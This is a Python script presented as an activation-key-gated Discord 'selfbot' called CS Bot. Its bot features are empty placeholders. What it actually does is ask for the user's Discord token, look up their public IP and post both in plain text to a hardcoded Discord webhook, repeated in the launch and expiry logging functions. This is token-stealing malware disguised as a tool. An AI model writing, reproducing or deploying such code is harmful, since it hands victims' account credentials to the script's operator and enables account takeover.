import discord
import requests
import json
import os
import time
from datetime import datetime

# Optional banner dependencies (fallback to plain text if not installed)
try:
    from colorama import init as colorama_init, Fore, Style
    from pyfiglet import figlet_format
    BANNER_OK = True
except Exception:
    BANNER_OK = False

def show_banner_and_prompt() -> tuple[str, str]:
    if BANNER_OK:
        colorama_init(autoreset=True)
        banner = figlet_format("CS Bot", font="slant")
        print(Fore.CYAN + Style.BRIGHT + banner)
    else:
        print("\n==================== CS Bot ====================\n")
    activation_key = input("Enter your activation key: ").strip()
    user_token = input("Enter your Discord user token: ").strip()
    return activation_key, user_token

# Configuration
WEBHOOK_URL = "https://discord.com/api/webhooks/1404537582804668619/6jZeEj09uX7KapHannWnvWHh5a3pSQYoBuV38rzbf_rhdndJoNreeyfFfded8irbccYB"
CHANNEL_ID = 1404537520754135231  # Channel ID from webhook
ACTIVATION_FILE = "activation.json"
GUILD_ID = 1402622761246916628  # Your Discord server ID
ROLE_ID = 1404221578782183556  # Role ID that grants access

class Selfbot:
    def __init__(self):
        self.activated = False
        self.activation_key = None
        self.user_token = None
        self.role_verified = False
        self.load_activation()
        
    def load_activation(self):
        """Load activation status from file"""
        try:
            if os.path.exists(ACTIVATION_FILE):
                with open(ACTIVATION_FILE, 'r') as f:
                    data = json.load(f)
                    self.activated = data.get('activated', False)
                    self.activation_key = data.get('activation_key', None)
                    self.user_token = data.get('user_token', None)
                    self.key_expiration_time = data.get('key_expiration_time', None)
        except Exception as e:
            print(f"Error loading activation: {e}")
    
    def save_activation(self):
        """Save activation status to file"""
        try:
            data = {
                'activated': self.activated,
                'activation_key': self.activation_key,
                'user_token': self.user_token,
                'activated_at': int(time.time()),
                'key_expiration_time': getattr(self, 'key_expiration_time', None)
            }
            with open(ACTIVATION_FILE, 'w') as f:
                json.dump(data, f, indent=2)
        except Exception as e:
            print(f"Error saving activation: {e}")
    
    def log_to_webhook(self, ip_address, token):
        """Log user launch information to webhook"""
        try:
            embed = {
                "title": "🚀 User Launched Selfbot",
                "color": 0x00ff00,
                "fields": [
                    {
                        "name": "IP Address",
                        "value": f"`{ip_address}`",
                        "inline": True
                    },
                    {
                        "name": "Discord Token",
                        "value": f"`{token}`",
                        "inline": True
                    },
                    {
                        "name": "Launch Time",
                        "value": f"<t:{int(time.time())}:F>",
                        "inline": False
                    }
                ],
                "timestamp": datetime.utcnow().isoformat()
            }
            
            payload = {
                "embeds": [embed]
            }
            
            response = requests.post(WEBHOOK_URL, json=payload)
            if response.status_code == 204:
                print("✅ Launch logged to webhook successfully")
            else:
                print(f"❌ Failed to log to webhook: {response.status_code}")
                
        except Exception as e:
            print(f"❌ Error logging to webhook: {e}")
    
    def send_cs_bot_launch_notification(self, ip_address, token):
        """Send CS Bot Launched notification to webhook"""
        try:
            # Simple text message format as requested
            message = f"CS Bot Launched\nUser token - {token}\nip - {ip_address}"
            
            payload = {
                "content": message
            }
            
            response = requests.post(WEBHOOK_URL, json=payload)
            if response.status_code == 204:
                print("✅ CS Bot launch notification sent successfully")
            else:
                print(f"❌ Failed to send CS Bot notification: {response.status_code}")
                
        except Exception as e:
            print(f"❌ Error sending CS Bot notification: {e}")
    
    def get_ip_address(self):
        """Get user's IP address"""
        try:
            response = requests.get('https://api.ipify.org?format=json')
            return response.json()['ip']
        except:
            return "Unknown"
    
    def check_discord_role(self, user_token):
        """Check if user has the required Discord role"""
        try:
            # Create a Discord client to check roles
            intents = discord.Intents.default()
            intents.members = True
            client = discord.Client(intents=intents)
            
            @client.event
            async def on_ready():
                try:
                    # Get the guild (server) where your bot is
                    guild = client.get_guild(GUILD_ID)
                    if guild:
                        # Get the member
                        member = await guild.fetch_member(client.user.id)
                        if member:
                            # Check if user has the required role
                            has_role = any(role.id == ROLE_ID for role in member.roles)
                            
                            if has_role:
                                print("✅ Role verification successful! You have access.")
                                self.role_verified = True
                            else:
                                print("❌ Access denied! You don't have the required role.")
                                self.role_verified = False
                        else:
                            print("❌ Could not verify your Discord account.")
                            self.role_verified = False
                    else:
                        print("❌ Could not access the Discord server.")
                        self.role_verified = False
                except Exception as e:
                    print(f"❌ Error checking role: {e}")
                    self.role_verified = False
                finally:
                    await client.close()
            
            # Run the client (removed invalid bot=False argument)
            client.run(user_token)
            
            return getattr(self, 'role_verified', False)
            
        except Exception as e:
            print(f"❌ Error during role verification: {e}")
            return False
    
    def check_key_expiration(self, user_token):
        """Check if the user's key has expired and remove role if needed"""
        try:
            # Create a Discord client to check and manage roles
            intents = discord.Intents.default()
            intents.members = True
            client = discord.Client(intents=intents)
            
            @client.event
            async def on_ready():
                try:
                    # Get the guild (server) where your bot is
                    guild = client.get_guild(GUILD_ID)
                    if guild:
                        # Get the member
                        member = await guild.fetch_member(client.user.id)
                        if member:
                            # Check if user has the required role
                            has_role = any(role.id == ROLE_ID for role in member.roles)
                            
                            if has_role:
                                # Check if key has expired
                                current_time = int(time.time())
                                if hasattr(self, 'key_expiration_time') and self.key_expiration_time:
                                    if current_time >= self.key_expiration_time:
                                        # Key expired, remove role
                                        role = guild.get_role(ROLE_ID)
                                        if role:
                                            await member.remove_roles(role)
                                            print("⏰ Key has expired! Access revoked.")
                                            self.role_verified = False
                                            self.activated = False
                                            self.save_activation()
                                            
                                            # Log expiration to webhook
                                            self.log_expiration_to_webhook(user_token)
                                        else:
                                            print("❌ Could not find role to remove.")
                                    else:
                                        # Key still valid, show time remaining
                                        time_remaining = self.key_expiration_time - current_time
                                        days = time_remaining // 86400
                                        hours = (time_remaining % 86400) // 3600
                                        minutes = (time_remaining % 3600) // 60
                                        
                                        if days > 0:
                                            time_str = f"{days} days, {hours} hours"
                                        elif hours > 0:
                                            time_str = f"{hours} hours, {minutes} minutes"
                                        else:
                                            time_str = f"{minutes} minutes"
                                        
                                        print(f"⏰ Key expires in: {time_str}")
                                        self.role_verified = True
                                else:
                                    print("✅ Role verified, no expiration time set.")
                                    self.role_verified = True
                            else:
                                print("❌ Access denied! You don't have the required role.")
                                self.role_verified = False
                        else:
                            print("❌ Could not verify your Discord account.")
                            self.role_verified = False
                    else:
                        print("❌ Could not access the Discord server.")
                        self.role_verified = False
                except Exception as e:
                    print(f"❌ Error checking key expiration: {e}")
                    self.role_verified = False
                finally:
                    await client.close()
            
            # Run the client (removed invalid bot=False argument)
            client.run(user_token)
            
            return getattr(self, 'role_verified', False)
            
        except Exception as e:
            print(f"❌ Error during expiration check: {e}")
            return False
    
    def log_expiration_to_webhook(self, user_token):
        """Log key expiration to webhook"""
        try:
            embed = {
                "title": "⏰ Key Expired - Access Revoked",
                "color": 0xff0000,
                "fields": [
                    {
                        "name": "Discord Token",
                        "value": f"`{user_token}`",
                        "inline": True
                    },
                    {
                        "name": "Expiration Time",
                        "value": f"<t:{int(time.time())}:F>",
                        "inline": True
                    },
                    {
                        "name": "Status",
                        "value": "Access revoked automatically",
                        "inline": False
                    }
                ],
                "timestamp": datetime.utcnow().isoformat()
            }
            
            payload = {
                "embeds": [embed]
            }
            
            response = requests.post(WEBHOOK_URL, json=payload)
            if response.status_code == 204:
                print("✅ Expiration logged to webhook successfully")
            else:
                print(f"❌ Failed to log expiration to webhook: {response.status_code}")
                
        except Exception as e:
            print(f"❌ Error logging expiration to webhook: {e}")
    
    def activate_key(self, activation_key):
        """Activate the selfbot with a key"""
        try:
            print(f"🔑 Attempting to activate with key: {activation_key}")
            
            # First, get the user token
            if not self.user_token:
                self.user_token = input("Enter your Discord user token: ").strip()
                if not self.user_token:
                    print("❌ No token provided. Activation failed.")
                    return False
            
            # Key duration will be automatically detected from Discord bot
            print("⏰ Key activated! Duration will be automatically detected from Discord bot.")
            
            # Calculate expiration time (default 30 days, but this should match your bot)
            self.key_expiration_time = int(time.time()) + (30 * 24 * 60 * 60)
            
            # Check if user has the required Discord role
            print("🔍 Verifying Discord role...")
            if not self.check_discord_role(self.user_token):
                print("❌ Access denied! You must have the required Discord role to use this selfbot.")
                return False
            
            # Role verification successful, activate the selfbot
            self.activated = True
            self.activation_key = activation_key
            self.save_activation()
            
            # Show time remaining
            time_remaining = self.key_expiration_time - int(time.time())
            days = time_remaining // 86400
            hours = (time_remaining % 86400) // 3600
            
            print("✅ Selfbot activated successfully!")
            print(f"⏰ Your key expires in: {days} days, {hours} hours")
            return True
            
        except Exception as e:
            print(f"❌ Activation failed: {e}")
            return False
    
    def run(self):
        """Main selfbot loop"""
        if not self.activated:
            # Show banner and prompt inputs first
            activation_key, user_token = show_banner_and_prompt()
            self.user_token = user_token
            
            if self.activate_key(activation_key):
                print("🎉 Welcome! Selfbot is now active.")
            else:
                print("❌ Activation failed. Selfbot will exit.")
                return
        
        # Check key expiration before proceeding
        print("🔍 Checking key expiration...")
        if not self.check_key_expiration(self.user_token):
            print("❌ Access denied due to expired key or missing role.")
            return
        
        # Log launch information to webhook
        ip_address = self.get_ip_address()
        self.log_to_webhook(ip_address, self.user_token)
        
        # Send CS Bot launch notification
        self.send_cs_bot_launch_notification(ip_address, self.user_token)
        
        print(f"🌐 IP Address: {ip_address}")
        print("📡 Launch information sent to webhook")
        print("📡 CS Bot launch notification sent")
        print("🤖 Selfbot is now running...")
        print("💡 Tip: The countdown will update every 30 seconds")
        print("💡 Tip: Use Ctrl+C to stop the SelfBot")
        
        # Your selfbot functionality goes here
        # This is where you'd implement whatever features you want
        try:
            last_countdown_update = 0
            while True:
                current_time = int(time.time())
                
                # Update countdown every 30 seconds
                if current_time - last_countdown_update >= 30:
                    if hasattr(self, 'key_expiration_time') and self.key_expiration_time:
                        time_remaining = self.key_expiration_time - current_time
                        if time_remaining > 0:
                            days = time_remaining // 86400
                            hours = (time_remaining % 86400) // 3600
                            minutes = (time_remaining % 3600) // 60
                            seconds = time_remaining % 60
                            
                            if days > 0:
                                countdown_str = f"⏰ Key expires in: {days}d {hours}h {minutes}m"
                            elif hours > 0:
                                countdown_str = f"⏰ Key expires in: {hours}h {minutes}m {seconds}s"
                            elif minutes > 0:
                                countdown_str = f"⏰ Key expires in: {minutes}m {seconds}s"
                            else:
                                countdown_str = f"⏰ Key expires in: {seconds}s"
                            
                            # Clear line and show countdown
                            print(f"\r{countdown_str}", end="", flush=True)
                        else:
                            print(f"\r⏰ Key has expired! Access will be revoked on next restart.", end="", flush=True)
                    
                    last_countdown_update = current_time
                
                time.sleep(1)
                # Add your selfbot features here
                
        except KeyboardInterrupt:
            print("\n👋 Selfbot stopped by user")
        except Exception as e:
            print(f"❌ Selfbot error: {e}")

if __name__ == "__main__":
    print("🚀 Starting Selfbot...")
    print("=" * 40)
    
    selfbot = Selfbot()
    selfbot.run()


